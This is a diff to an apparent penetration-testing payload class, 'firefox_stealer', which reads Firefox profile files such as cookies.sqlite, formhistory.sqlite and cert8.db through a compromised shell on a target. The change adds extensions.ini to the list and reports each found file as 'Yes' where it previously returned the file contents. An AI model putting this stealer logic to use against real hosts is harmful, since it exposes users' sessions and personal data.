@@ -11,6 +11,7 @@ class firefox_stealer(base_payload):
         result = {}
         files = []
 
+        # Firefox 4
         files.append('bookmarks.html')
         files.append('content-prefs.sqlite')
         files.append('cookies.sqlite')
@@ -22,6 +23,9 @@ class firefox_stealer(base_payload):
         files.append('cert8.db')
         files.append('formhistory.sqlite')
         files.append('places.sqlite')
+        
+        # Firefox 5
+        files.append('extensions.ini')
 
         def parse_mozilla_dir_path (profile):
             return re.findall('(?<=Path=)(.*)', profile, re.MULTILINE)
@@ -40,7 +44,7 @@ class firefox_stealer(base_payload):
                     mozilla_file_fp = home+'.mozilla/firefox/'+directory+'/'+mozilla_file
                     content = self.shell.read(mozilla_file_fp)
                     if content:
-                        result[mozilla_file_fp] = content
+                        result[mozilla_file_fp] = 'Yes'
 
         return result
     
